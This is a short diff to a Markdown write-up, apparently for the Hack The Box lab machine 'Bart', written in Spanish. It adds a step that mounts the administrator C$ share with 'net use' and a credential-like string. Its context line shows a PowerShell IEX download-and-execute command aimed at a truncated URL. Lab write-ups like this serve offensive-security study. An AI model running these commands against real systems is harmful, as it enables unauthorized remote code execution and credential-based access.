@@ -208,7 +208,14 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 ```
 
+## Net use Montar un file system
 
+![image](https://github.com/gecr07/Bart-HTB/assets/63270579/514198ae-a2c2-4b73-9b9b-b15908ac7fbf)
+
+
+```
+net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
+```
 
 
 
